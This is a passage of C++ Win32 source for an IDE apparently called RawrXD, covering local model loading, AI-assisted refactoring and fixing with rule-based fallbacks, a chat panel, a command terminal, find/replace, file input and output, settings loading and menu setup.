bool LoadInferenceEngine() {
    if (g_hInferenceEngine) return true;
    g_hInferenceEngine = LoadLibraryW(L"RawrXD_InferenceEngine.dll");
    if (!g_hInferenceEngine) {
        AppendWindowText(g_hwndOutput, L"[AI] Inference Engine DLL not found.\r\n");
        return false;
    }

    pLoadModel = (LoadModel_t)GetProcAddress(g_hInferenceEngine, "LoadModel");
    pUnloadModel = (UnloadModel_t)GetProcAddress(g_hInferenceEngine, "UnloadModel");
    pForwardPassInfer = (ForwardPassInfer_t)GetProcAddress(g_hInferenceEngine, "ForwardPass");
    pSampleNext = (SampleNext_t)GetProcAddress(g_hInferenceEngine, "SampleNext");

    if (!pLoadModel || !pUnloadModel || !pForwardPassInfer || !pSampleNext) {
        AppendWindowText(g_hwndOutput, L"[AI] Inference Engine functions missing.\r\n");
        FreeLibrary(g_hInferenceEngine);
        g_hInferenceEngine = nullptr;
        return false;
    }

    AppendWindowText(g_hwndOutput, L"[AI] Inference Engine loaded.\r\n");
    return true;
}

bool LoadModelWithInferenceEngine(const std::wstring& modelPath) {
    if (!pLoadModel) return false;
    g_modelContext = pLoadModel(modelPath.c_str());
    if (!g_modelContext) {
        AppendWindowText(g_hwndOutput, L"[AI] Failed to load model.\r\n");
        return false;
    }
    g_modelLoaded = true;
    g_loadedModelPath = modelPath;
    AppendWindowText(g_hwndOutput, (L"[AI] Model loaded: " + modelPath + L"\r\n").c_str());
    return true;
}

void LoadGGUFModel() {
    if (!LoadInferenceEngine()) return;
    OPENFILENAMEW ofn = { sizeof(ofn) };
    WCHAR szFile[MAX_PATH] = {0};
    ofn.hwndOwner = g_hwndMain;
    ofn.lpstrFile = szFile;
    ofn.nMaxFile = MAX_PATH;
    ofn.lpstrFilter = L"GGUF Models\0*.gguf\0All Files\0*.*\0";
    ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
    if (GetOpenFileNameW(&ofn)) {
        if (g_modelContext) {
            UnloadInferenceModel();
        }
        if (LoadModelWithInferenceEngine(szFile)) {
            StartInferenceThread();
        }
    }
}

void AI_LoadModel() {
    AppendWindowText(g_hwndOutput, L"[AI] Loading Titan model...\r\n");
    if (!LoadTitanKernel()) {
        AppendWindowText(g_hwndOutput, L"[AI] Titan Kernel DLL unavailable. Trying Inference Engine...\r\n");
        if (!LoadInferenceEngine()) {
            AppendWindowText(g_hwndOutput, L"[AI] No inference backend available. Load a GGUF model instead.\r\n");
            return;
        }
    }
    OPENFILENAMEW ofn = { sizeof(ofn) };
    WCHAR szFile[MAX_PATH] = {0};
    ofn.hwndOwner = g_hwndMain;
    ofn.lpstrFile = szFile;
    ofn.nMaxFile = MAX_PATH;
    ofn.lpstrFilter = L"Model Files\0*.gguf;*.bin;*.model\0All Files\0*.*\0";
    ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
    if (GetOpenFileNameW(&ofn)) {
        // Try Titan first
        if (pTitan_LoadModel) {
            std::string path = WideToUtf8(szFile);
            if (pTitan_LoadModel(path.c_str(), "default") == 0) {
                g_modelLoaded = true;
                g_loadedModelPath = szFile;
                AppendWindowText(g_hwndOutput, (L"[AI] Titan model loaded: " + std::wstring(szFile) + L"\r\n").c_str());
                StartInferenceThread();
                return;
            }
            AppendWindowText(g_hwndOutput, L"[AI] Titan couldn't load this model. Trying Inference Engine...\r\n");
        }
        // Fallback: load InferenceEngine if not already loaded, then try it
        if (!pLoadModel) {
            LoadInferenceEngine();
        }
        if (pLoadModel) {
            if (LoadModelWithInferenceEngine(szFile)) {
                StartInferenceThread();
                return;
            }
        }
        AppendWindowText(g_hwndOutput, L"[AI] Failed to load model file.\r\n");
    }
}

void RefactorSelectedCode() {
    if (!g_hwndEditor) return;
    
    DWORD selStart = 0, selEnd = 0;
    SendMessage(g_hwndEditor, EM_GETSEL, (WPARAM)&selStart, (LPARAM)&selEnd);
    
    if (selStart == selEnd) {
        if (g_hwndChatHistory) {
            AppendWindowText(g_hwndChatHistory, L"AI: Please select code to refactor.\r\n");
        }
        return;
    }
    
    // Get selected text
    int selLen = selEnd - selStart;
    std::wstring selected(selLen + 1, 0);
    SendMessage(g_hwndEditor, EM_SETSEL, selStart, selEnd);
    SendMessage(g_hwndEditor, EM_GETSELTEXT, 0, (LPARAM)selected.c_str());
    selected.resize(wcslen(selected.c_str()));
    
    if (g_hwndChatHistory) {
        AppendWindowText(g_hwndChatHistory, L"\r\nAI: Analyzing code for refactoring...\r\n");
    }

    std::string code = WideToUtf8(selected);
    
    // ── Tier 1: Model-based refactoring via Titan ──
    if (g_hTitanDll && pTitan_RunInference && g_modelLoaded) {
        std::string prompt = "Refactor the following code for better readability and performance:\n\n```\n" + code + "\n```\n\nRefactored version:";
        int result = pTitan_RunInference(0, prompt.c_str(), 1024);
        if (result >= 0) {
            AppendWindowText(g_hwndOutput, L"[AI] Titan refactoring inference completed.\r\n");
            // Result is posted asynchronously
        }
    }
    
    // ── Tier 2: InferenceEngine token-level refactoring ──
    if (g_modelLoaded && pForwardPassInfer && pSampleNext && g_modelContext) {
        std::string prompt = "Refactor this code:\n```\n" + code + "\n```\nRefactored: ";
        
        std::vector<int> tokens;
        tokens.reserve(prompt.size());
        for (unsigned char c : prompt) tokens.push_back(c);
        
        std::vector<float> logits(32000, 0.0f);
        if (pForwardPassInfer(g_modelContext, tokens.data(), (int)tokens.size(), logits.data()) == 0) {
            std::string refactored;
            refactored.reserve(2048);
            
            for (int i = 0; i < 1024 && !g_bAbortInference; i++) {
                int next = pSampleNext(logits.data(), 32000, 0.8f, 0.9f, 40);
                if (next <= 0) break;
                
                refactored += (char)next;
                tokens.push_back(next);
                
                // Stop on code block end markers
                if (refactored.size() > 20 && 
                    (refactored.find("\n```\n") != std::string::npos ||
                     refactored.find("```") != std::string::npos)) break;
                
                if (pForwardPassInfer(g_modelContext, tokens.data(), (int)tokens.size(), logits.data()) != 0) break;
            }
            
            if (!refactored.empty()) {
                std::wstring wRefactored = Utf8ToWide(refactored);
                if (g_hwndChatHistory) {
                    AppendWindowText(g_hwndChatHistory, L"\r\n--- AI Model Refactoring ---\r\n");
                    AppendWindowText(g_hwndChatHistory, wRefactored.c_str());
                    AppendWindowText(g_hwndChatHistory, L"\r\n--- End Refactoring ---\r\n");
                }
                return;
            }
        }
    }
    
    // ── Tier 3: Rule-based refactoring ──
    if (g_hwndChatHistory) {
        std::string refactored = code;
        std::vector<std::string> changes;
        
        // Rule 1: Convert tabs to spaces
        size_t pos = 0;
        while ((pos = refactored.find('\t', pos)) != std::string::npos) {
            refactored.replace(pos, 1, "    ");
            changes.push_back("Converted tabs to spaces");
            pos += 4;
        }
        
        // Rule 2: Add missing spaces around operators
        std::vector<std::pair<std::string, std::string>> operators = {
            {"=", " = "}, {"==", " == "}, {"!=", " != "}, {"<=", " <= "}, {">=", " >= "},
            {"+=", " += "}, {"-=", " -= "}, {"*=", " *= "}, {"/=", " /= "}, {"%=", " %= "},
            {"&&", " && "}, {"||", " || "}, {"<<", " << "}, {">>", " >> "}
        };
        
        for (const auto& op : operators) {
            pos = 0;
            while ((pos = refactored.find(op.first, pos)) != std::string::npos) {
                // Check if already has spaces
                if (pos > 0 && refactored[pos-1] != ' ' && 
                    pos + op.first.size() < refactored.size() && refactored[pos + op.first.size()] != ' ') {
                    refactored.replace(pos, op.first.size(), op.second);
                    changes.push_back("Added spaces around '" + op.first + "'");
                    pos += op.second.size();
                } else {
                    pos += op.first.size();
                }
            }
        }
        
        // Rule 3: Fix common brace styles
        pos = 0;
        while ((pos = refactored.find("{\n", pos)) != std::string::npos) {
            if (pos > 0 && refactored[pos-1] != ' ' && refactored[pos-1] != '\t' && refactored[pos-1] != '\n') {
                refactored.insert(pos, " ");
                changes.push_back("Added space before opening brace");
                pos += 2;
            } else {
                pos += 2;
            }
        }
        
        // Rule 4: Remove trailing whitespace
        std::istringstream stream(refactored);
        std::string line;
        std::string cleaned;
        bool hasChanges = false;
        
        while (std::getline(stream, line)) {
            size_t end = line.find_last_not_of(" \t");
            if (end != std::string::npos) {
                line = line.substr(0, end + 1);
            } else if (!line.empty()) {
                line.clear();
                hasChanges = true;
            }
            cleaned += line + "\n";
        }
        
        if (hasChanges || !changes.empty()) {
            refactored = cleaned;
            std::wstring wRefactored = Utf8ToWide(refactored);
            AppendWindowText(g_hwndChatHistory, L"\r\n--- Rule-Based Refactoring ---\r\n");
            for (const auto& change : changes) {
                AppendWindowText(g_hwndChatHistory, (L"  \u2705 " + Utf8ToWide(change) + L"\r\n").c_str());
            }
            AppendWindowText(g_hwndChatHistory, L"\r\nRefactored code:\r\n");
            AppendWindowText(g_hwndChatHistory, wRefactored.c_str());
            AppendWindowText(g_hwndChatHistory, L"\r\n--- End Refactoring ---\r\n");
        } else {
            AppendWindowText(g_hwndChatHistory, L"\r\nNo refactoring suggestions found.\r\n");
        }
    }
}

// ============================================================================
// UI Creation Functions
// ============================================================================
void CreateChatPanel() {
    if (g_hwndChatPanel) return;
    
    // Create chat panel container
    g_hwndChatPanel = CreateWindowExW(0, L"STATIC", nullptr,
                                    WS_CHILD | WS_VISIBLE | WS_CLIPCHILDREN,
                                    0, 0, 300, 400, g_hwndMain, nullptr, g_hInstance, nullptr);
    
    // Create chat history
    g_hwndChatHistory = CreateWindowExW(0, L"EDIT", nullptr,
                                      WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_READONLY,
                                      5, 5, 290, 320, g_hwndChatPanel, nullptr, g_hInstance, nullptr);
    
    // Create chat input
    g_hwndChatInput = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", nullptr,
                                    WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL,
                                    5, 330, 200, 25, g_hwndChatPanel, nullptr, g_hInstance, nullptr);
    
    // Create send button
    g_hwndChatSend = CreateWindowExW(0, L"BUTTON", L"Send",
                                   WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                                   210, 330, 80, 25, g_hwndChatPanel, (HMENU)ID_CHAT_SEND, g_hInstance, nullptr);
    
    // Set fonts
    if (g_hFontUI) {
        SendMessage(g_hwndChatHistory, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);
        SendMessage(g_hwndChatInput, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);
        SendMessage(g_hwndChatSend, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);
    }
    
    // Initial chat message
    if (g_hwndChatHistory) {
        AppendWindowText(g_hwndChatHistory, L"RawrXD AI Chat\r\n");
        AppendWindowText(g_hwndChatHistory, L"Type a message and click Send, or use AI > Explain Code with selected text.\r\n");
    }
    
    AppendWindowText(g_hwndOutput, L"[UI] Chat panel created.\r\n");
}

void CreateIssuesPanel() {
    if (g_hwndIssuesList) return;
    
    g_hwndIssuesList = CreateWindowExW(WS_EX_CLIENTEDGE, L"LISTBOX", nullptr,
                                     WS_CHILD | WS_VISIBLE | WS_VSCROLL | LBS_NOTIFY,
                                     0, 0, 300, 200, g_hwndMain, nullptr, g_hInstance, nullptr);
    
    if (g_hFontUI) {
        SendMessage(g_hwndIssuesList, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);
    }
    
    AppendWindowText(g_hwndOutput, L"[UI] Issues panel created.\r\n");
}

// (WPARAM dispatch handlers removed - all menu items handled inline in WM_COMMAND)


// ============================================================================
// Terminal Integration
// ============================================================================
void CreateTerminal() {
    if (g_hwndTerminal) return;
    
    // Create terminal panel using MonacoIntegration
    g_hwndTerminal = CreateWindowExW(0, L"EDIT", nullptr,
                                   WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_READONLY,
                                   0, 0, 100, 100, g_hwndMain, nullptr, g_hInstance, nullptr);
    
    if (g_hwndTerminal) {
        SendMessage(g_hwndTerminal, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);
        AppendWindowText(g_hwndTerminal, L"RawrXD Terminal\r\n> ");
        AppendWindowText(g_hwndOutput, L"[Terminal] Terminal panel created.\r\n");
    }
}

void ExecuteTerminalCommand(const std::wstring& command) {
    if (command.empty()) return;
    
    if (g_hwndTerminal) {
        AppendWindowText(g_hwndTerminal, (L"\r\n> " + command + L"\r\n").c_str());
    }
    
    // Execute command using system()
    std::string cmd = WideToUtf8(command);
    int result = system(cmd.c_str());
    
    if (g_hwndTerminal) {
        if (result == 0) {
            AppendWindowText(g_hwndTerminal, L"Command executed successfully.\r\n> ");
        } else {
            AppendWindowText(g_hwndTerminal, L"Command failed.\r\n> ");
        }
    }
}

// ============================================================================
// Find/Replace Implementation
// ============================================================================
void ShowFindDialog() {
    if (g_hwndFindDlg) { SetFocus(g_hwndFindDlg); return; }
    if (!g_uFindReplaceMsg) g_uFindReplaceMsg = RegisterWindowMessage(FINDMSGSTRING);
    ZeroMemory(&g_fr, sizeof(g_fr));
    g_fr.lStructSize = sizeof(g_fr);
    g_fr.hwndOwner = g_hwndMain;
    g_fr.lpstrFindWhat = g_szFindWhat;
    g_fr.wFindWhatLen = sizeof(g_szFindWhat) / sizeof(wchar_t);
    g_fr.Flags = FR_DOWN;
    g_hwndFindDlg = FindText(&g_fr);
}

void ShowReplaceDialog() {
    if (g_hwndFindDlg) { SetFocus(g_hwndFindDlg); return; }
    if (!g_uFindReplaceMsg) g_uFindReplaceMsg = RegisterWindowMessage(FINDMSGSTRING);
    ZeroMemory(&g_fr, sizeof(g_fr));
    g_fr.lStructSize = sizeof(g_fr);
    g_fr.hwndOwner = g_hwndMain;
    g_fr.lpstrFindWhat = g_szFindWhat;
    g_fr.wFindWhatLen = sizeof(g_szFindWhat) / sizeof(wchar_t);
    g_fr.lpstrReplaceWith = g_szReplaceWith;
    g_fr.wReplaceWithLen = sizeof(g_szReplaceWith) / sizeof(wchar_t);
    g_fr.Flags = FR_DOWN;
    g_hwndFindDlg = ReplaceText(&g_fr);
}

void HandleFindReplace(LPFINDREPLACE pfr) {
    if (!pfr || !g_hwndEditor) return;
    if (pfr->Flags & FR_DIALOGTERM) { g_hwndFindDlg = nullptr; return; }
    if (pfr->Flags & (FR_FINDNEXT | FR_REPLACE | FR_REPLACEALL)) {
        FINDTEXTEX ft = {};
        DWORD selStart = 0, selEnd = 0;
        SendMessage(g_hwndEditor, EM_GETSEL, (WPARAM)&selStart, (LPARAM)&selEnd);
        ft.chrg.cpMin = (pfr->Flags & FR_REPLACEALL) ? 0 : selEnd;
        ft.chrg.cpMax = -1;
        ft.lpstrText = pfr->lpstrFindWhat;
        DWORD flags = (pfr->Flags & FR_MATCHCASE) ? FR_MATCHCASE : 0;
        flags |= (pfr->Flags & FR_WHOLEWORD) ? FR_WHOLEWORD : 0;
        if (pfr->Flags & FR_REPLACEALL) {
            int count = 0;
            ft.chrg.cpMin = 0;
            while (true) {
                LRESULT pos = SendMessage(g_hwndEditor, EM_FINDTEXTEX, flags, (LPARAM)&ft);
                if (pos == -1) break;
                SendMessage(g_hwndEditor, EM_SETSEL, ft.chrgText.cpMin, ft.chrgText.cpMax);
                SendMessage(g_hwndEditor, EM_REPLACESEL, TRUE, (LPARAM)pfr->lpstrReplaceWith);
                ft.chrg.cpMin = ft.chrgText.cpMin + (LONG)wcslen(pfr->lpstrReplaceWith);
                count++;
            }
            wchar_t msg[128];
            swprintf_s(msg, L"Replaced %d occurrences.", count);
            AppendWindowText(g_hwndOutput, msg);
            AppendWindowText(g_hwndOutput, L"\r\n");
            g_isDirty = true;
        } else {
            LRESULT pos = SendMessage(g_hwndEditor, EM_FINDTEXTEX, flags, (LPARAM)&ft);
            if (pos != -1) {
                SendMessage(g_hwndEditor, EM_SETSEL, ft.chrgText.cpMin, ft.chrgText.cpMax);
                SendMessage(g_hwndEditor, EM_SCROLLCARET, 0, 0);
                if (pfr->Flags & FR_REPLACE) {
                    SendMessage(g_hwndEditor, EM_REPLACESEL, TRUE, (LPARAM)pfr->lpstrReplaceWith);
                    g_isDirty = true;
                }
            } else {
                MessageBox(g_hwndMain, L"No more matches found.", L"Find", MB_ICONINFORMATION);
            }
        }
    }
}

// ============================================================================
// File Operations
// ============================================================================
void OpenFile(const std::wstring& filePath) {
    // Convert wide string to narrow string for ifstream
    int narrowSize = WideCharToMultiByte(CP_UTF8, 0, filePath.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string narrowPath(narrowSize - 1, '\0');
    WideCharToMultiByte(CP_UTF8, 0, filePath.c_str(), -1, &narrowPath[0], narrowSize, nullptr, nullptr);
    
    std::ifstream file(narrowPath, std::ios::binary);
    if (!file.is_open()) {
        MessageBox(g_hwndMain, L"Failed to open file", L"Error", MB_ICONERROR);
        return;
    }
    
    file.seekg(0, std::ios::end);
    size_t size = file.tellg();
    file.seekg(0, std::ios::beg);
    
    std::string content(size, '\0');
    file.read(&content[0], size);
    file.close();
    
    // Convert to wide string
    int wideSize = MultiByteToWideChar(CP_UTF8, 0, content.c_str(), -1, nullptr, 0);
    std::wstring wideContent(wideSize, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, content.c_str(), -1, &wideContent[0], wideSize);
    
    CreateNewTab(filePath);
    if (g_hwndEditor) {
        SetWindowText(g_hwndEditor, wideContent.c_str());
        g_isDirty = false;
    }
}

void SaveCurrentFile() {
    if (g_currentFile.empty()) {
        SaveFileAs();
        return;
    }
    
    if (!g_hwndEditor) return;
    
    int textLen = GetWindowTextLength(g_hwndEditor);
    std::wstring content(textLen + 1, L'\0');
    GetWindowText(g_hwndEditor, &content[0], textLen + 1);
    content.resize(textLen);
    
    // Convert to UTF-8
    int utf8Size = WideCharToMultiByte(CP_UTF8, 0, content.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string utf8Content(utf8Size, '\0');
    WideCharToMultiByte(CP_UTF8, 0, content.c_str(), -1, &utf8Content[0], utf8Size, nullptr, nullptr);
    
    // Convert wide path to narrow for ofstream
    int pathSize = WideCharToMultiByte(CP_UTF8, 0, g_currentFile.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string narrowPath(pathSize - 1, '\0');
    WideCharToMultiByte(CP_UTF8, 0, g_currentFile.c_str(), -1, &narrowPath[0], pathSize, nullptr, nullptr);
    
    std::ofstream file(narrowPath, std::ios::binary);
    if (file.is_open()) {
        file.write(utf8Content.c_str(), utf8Content.length() - 1); // -1 to exclude null terminator
        file.close();
        g_isDirty = false;
        if (g_activeTab >= 0) g_tabs[g_activeTab].isDirty = false;
    }
}

void UpdateLayout(HWND hwnd) {
    // Implementation for updating window layout
    SendMessage(hwnd, WM_SIZE, 0, 0);
}

void LoadSettings() {
    std::wstring filePath = GetSettingsFilePath();
    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, 
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        AppendWindowText(g_hwndOutput, L"[Settings] No settings file found, using defaults.\r\n");
        return;
    }
    DWORD size = GetFileSize(hFile, nullptr);
    if (size == 0 || size > 65536) { CloseHandle(hFile); return; }
    std::string buf(size, '\0');
    DWORD bytesRead = 0;
    ReadFile(hFile, &buf[0], size, &bytesRead, nullptr);
    CloseHandle(hFile);
    buf.resize(bytesRead);

    // Minimal JSON parser for known keys
    auto extractInt = [&](const char* key) -> int {
        std::string k = std::string("\"" ) + key + "\":";
        auto p = buf.find(k);
        if (p == std::string::npos) return -1;
        p += k.size();
        while (p < buf.size() && (buf[p]==' '||buf[p]=='\t')) p++;
        return atoi(buf.c_str() + p);
    };
    auto extractBool = [&](const char* key) -> int {
        std::string k = std::string("\"" ) + key + "\":";
        auto p = buf.find(k);
        if (p == std::string::npos) return -1;
        p += k.size();
        while (p < buf.size() && (buf[p]==' '||buf[p]=='\t')) p++;
        return (buf.substr(p, 4) == "true") ? 1 : 0;
    };
    auto extractStr = [&](const char* key) -> std::string {
        std::string k = std::string("\"" ) + key + "\": \"";
        auto p = buf.find(k);
        if (p == std::string::npos) return "";
        p += k.size();
        auto e = buf.find('"', p);
        if (e == std::string::npos) return "";
        return buf.substr(p, e - p);
    };

    int fs = extractInt("fontSize");
    if (fs > 0) g_settings.fontSize = fs;
    int me = extractBool("minimapEnabled");
    if (me >= 0) g_settings.minimapEnabled = (me == 1);
    int cf = extractBool("codeFoldingEnabled");
    if (cf >= 0) g_settings.codeFoldingEnabled = (cf == 1);
    int tv = extractBool("terminalVisible");
    if (tv >= 0) g_settings.terminalVisible = (tv == 1);
    std::string theme = extractStr("theme");
    if (!theme.empty()) g_settings.theme = Utf8ToWide(theme);
    std::string ff = extractStr("fontFamily");
    if (!ff.empty()) g_settings.fontFamily = Utf8ToWide(ff);

    AppendWindowText(g_hwndOutput, L"[Settings] Settings loaded from disk.\r\n");
}

void CleanupHTTPClient() {
    // Implementation for cleaning up HTTP client
}

bool StartTerminal() {
    if (g_hCmdProcess) return true; // already running

    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    HANDLE hStdoutRead = nullptr, hStdoutWrite = nullptr;
    HANDLE hStdinRead = nullptr, hStdinWrite = nullptr;
    if (!CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0)) return false;
    if (!CreatePipe(&hStdinRead, &hStdinWrite, &sa, 0)) { CloseHandle(hStdoutRead); CloseHandle(hStdoutWrite); return false; }
    SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hStdinWrite, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hStdoutWrite;
    si.hStdError  = hStdoutWrite;
    si.hStdInput  = hStdinRead;
    PROCESS_INFORMATION pi = {};
    WCHAR cmd[] = L"cmd.exe";
    if (!CreateProcessW(nullptr, cmd, nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(hStdoutRead); CloseHandle(hStdoutWrite);
        CloseHandle(hStdinRead);  CloseHandle(hStdinWrite);
        AppendWindowText(g_hwndOutput, L"[Terminal] Failed to start cmd.exe.\r\n");
        return false;
    }
    CloseHandle(hStdoutWrite);
    CloseHandle(hStdinRead);
    g_hCmdProcess = pi.hProcess;
    CloseHandle(pi.hThread);
    g_hCmdStdoutRead = hStdoutRead;
    g_hCmdStdinWrite = hStdinWrite;
    if (!g_terminalCSInitialized) { InitializeCriticalSection(&g_terminalCS); g_terminalCSInitialized = true; }
    AppendWindowText(g_hwndOutput, L"[Terminal] cmd.exe started with I/O pipes.\r\n");
    return true;
}

void UnloadInferenceModel() {
    if (g_modelContext && pUnloadModel) {
        pUnloadModel(g_modelContext);
        g_modelContext = nullptr;
    }
    if (g_hTitanDll && pTitan_Shutdown) {
        pTitan_Shutdown();
    }
    g_modelLoaded = false;
    g_loadedModelPath.clear();
    AppendWindowText(g_hwndOutput, L"[AI] Model unloaded.\r\n");
}

void AI_UnloadModel() {
    UnloadInferenceModel();
    StopInferenceThread();
}

// ============================================================================
// Missing Function Aliases for Menu Handlers
// ============================================================================
void Build_Run() {
    RunCurrentFile();
}

void Build_Build() {
    CompileCurrentFile();
}

void AI_GenerateCode() {
    TriggerAICompletion();
}

void AI_ExplainCode() {
    ExplainSelectedCode();
}

void AI_RefactorCode() {
    RefactorSelectedCode();
}

// ============================================================================
// AI Code Fixing
// ============================================================================
void AI_FixCode() {
    if (!g_hwndEditor) return;
    AppendWindowText(g_hwndOutput, L"[AI] Running AI code fix analysis...\r\n");
    
    // Run static code analysis first
    RunCodeAnalysis();
    
    // Get full editor content for model-based fixing
    int textLen = GetWindowTextLength(g_hwndEditor);
    std::wstring fullContent(textLen + 1, L'\0');
    GetWindowText(g_hwndEditor, &fullContent[0], textLen + 1);
    fullContent.resize(textLen);
    
    int fixedCount = 0;
    
    // ── Phase 1: Auto-apply rule-based fixes (reverse order to maintain indices) ──
    {
        std::lock_guard<std::mutex> lock(g_issuesMutex);
        for (int i = (int)g_codeIssues.size() - 1; i >= 0; i--) {
            if (!g_codeIssues[i].isFixable) continue;
            
            int lineIndex = (int)SendMessage(g_hwndEditor, EM_LINEINDEX, g_codeIssues[i].line - 1, 0);
            int lineLen = (int)SendMessage(g_hwndEditor, EM_LINELENGTH, lineIndex, 0);
            
            std::wstring lineText(lineLen + 1, 0);
            *(WORD*)&lineText[0] = (WORD)(lineLen + 1);
            SendMessage(g_hwndEditor, EM_GETLINE, g_codeIssues[i].line - 1, (LPARAM)lineText.c_str());
            lineText.resize(lineLen);
            
            std::string originalLine = WideToUtf8(lineText);
            std::string fixedLine = originalLine;
            bool appliedFix = false;
            
            // Fix 1: Missing semicolons
            if (g_codeIssues[i].severity == L"Error" && 
                (originalLine.find("expected ';'") != std::string::npos || 
                 g_codeIssues[i].message.find(L"missing semicolon") != std::string::npos)) {
                // Add semicolon if line doesn't end with one and isn't a preprocessor directive
                if (!fixedLine.empty() && fixedLine.back() != ';' && fixedLine.back() != '{' && 
                    fixedLine.back() != '}' && fixedLine.back() != ':' && 
                    fixedLine.find('#') != 0 && fixedLine.find("//") != 0) {
                    fixedLine += ';';
                    appliedFix = true;
                }
            }
            
            // Fix 2: Uninitialized variables
            if (g_codeIssues[i].severity == L"Warning" && 
                g_codeIssues[i].message.find(L"uninitialized") != std::string::npos) {
                // Try to add initialization
                if (fixedLine.find("int ") != std::string::npos && fixedLine.find('=') == std::string::npos) {
                    size_t pos = fixedLine.find("int ");
                    size_t end = fixedLine.find(';', pos);
                    if (end != std::string::npos) {
                        fixedLine.insert(end, " = 0");
                        appliedFix = true;
                    }
                }
            }
            
            // Fix 3: Missing includes for common types
            if (g_codeIssues[i].severity == L"Error" && 
                (g_codeIssues[i].message.find(L"undeclared identifier") != std::string::npos ||
                 g_codeIssues[i].message.find(L"not declared") != std::string::npos)) {
                std::string identifier = WideToUtf8(g_codeIssues[i].message);
                // This would require more complex analysis - for now, suggest common includes
                if (identifier.find("string") != std::string::npos) {
                    // Suggest #include <string>
                    AppendWindowText(g_hwndOutput, L"[AI] Suggestion: Add #include <string> for std::string\r\n");
                }
            }
            
            if (appliedFix) {
                std::wstring wFixedLine = Utf8ToWide(fixedLine);
                // Replace the line in the editor
                SendMessage(g_hwndEditor, EM_SETSEL, lineIndex, lineIndex + lineLen);
                SendMessage(g_hwndEditor, EM_REPLACESEL, FALSE, (LPARAM)wFixedLine.c_str());
                fixedCount++;
                
                // Remove the issue from our list
                g_codeIssues.erase(g_codeIssues.begin() + i);
            }
        }
    }
    
    // ── Phase 2: Model-based fix suggestions ──
    if (!g_codeIssues.empty()) {
        std::string issuesSummary;
        {
            std::lock_guard<std::mutex> lock(g_issuesMutex);
            for (const auto& issue : g_codeIssues) {
                issuesSummary += "Line " + std::to_string(issue.line) + ": " + 
                               WideToUtf8(issue.message) + "\n";
            }
        }
        
        if (!issuesSummary.empty()) {
            // Queue inference for fix suggestions
            std::wstring prompt = L"Fix the following code issues:\n" + Utf8ToWide(issuesSummary) +
                                 L"\nSuggest fixes for each issue:";
            QueueInferenceRequest(prompt, 512, 0.5f);
            AppendWindowText(g_hwndOutput, L"[AI] Fix suggestions queued for inference.\r\n");
        }
    }
    
    if (fixedCount > 0) {
        g_isDirty = true;
        wchar_t msg[128];
        swprintf_s(msg, L"[AI] Auto-fixed %d issue(s).\r\n", fixedCount);
        AppendWindowText(g_hwndOutput, msg);
        
        if (g_hwndChatHistory) {
            AppendWindowText(g_hwndChatHistory, msg);
        }
    }
    
    int remaining = 0;
    {
        std::lock_guard<std::mutex> lock(g_issuesMutex);
        remaining = (int)g_codeIssues.size();
    }
    
    if (remaining > 0) {
        wchar_t msg[128];
        swprintf_s(msg, L"[AI] %d issue(s) require manual review.\r\n", remaining);
        AppendWindowText(g_hwndOutput, msg);
    } else if (fixedCount == 0) {
        AppendWindowText(g_hwndOutput, L"[AI] No issues found. Code looks clean!\r\n");
    }
}

void SendChatMessage() {
    HandleChatSend();
}

HMENU CreateMainMenu() {
    HMENU hMenuBar = CreateMenu();
    
    // File Menu
    HMENU hFileMenu = CreatePopupMenu();
    AppendMenu(hFileMenu, MF_STRING, ID_FILE_NEW, L"&New\tCtrl+N");
    AppendMenu(hFileMenu, MF_STRING, ID_FILE_OPEN, L"&Open...\tCtrl+O");
    AppendMenu(hFileMenu, MF_STRING, ID_FILE_OPENFOLDER, L"Open &Folder...\tCtrl+Shift+O");
    AppendMenu(hFileMenu, MF_SEPARATOR, 0, nullptr);
    AppendMenu(hFileMenu, MF_STRING, ID_FILE_SAVE, L"&Save\tCtrl+S");
    AppendMenu(hFileMenu, MF_STRING, ID_FILE_SAVEAS, L"Save &As...\tCtrl+Shift+S");
    AppendMenu(hFileMenu, MF_SEPARATOR, 0, nullptr);
    AppendMenu(hFileMenu, MF_STRING, ID_FILE_CLOSE, L"&Close\tCtrl+W");
    AppendMenu(hFileMenu, MF_SEPARATOR, 0, nullptr);
    AppendMenu(hFileMenu, MF_STRING, ID_FILE_EXIT, L"E&xit\tAlt+F4");
    AppendMenu(hMenuBar, MF_POPUP, (UINT_PTR)hFileMenu, L"&File");
    
    // Edit Menu
    HMENU hEditMenu = CreatePopupMenu();
    AppendMenu(hEditMenu, MF_STRING, ID_EDIT_UNDO, L"&Undo\tCtrl+Z");
    AppendMenu(hEditMenu, MF_STRING, ID_EDIT_REDO, L"&Redo\tCtrl+Y");
    AppendMenu(hEditMenu, MF_SEPARATOR, 0, nullptr);
    AppendMenu(hEditMenu, MF_STRING, ID_EDIT_CUT, L"Cu&t\tCtrl+X");
    AppendMenu(hEditMenu, MF_STRING, ID_EDIT_COPY, L"&Copy\tCtrl+C");
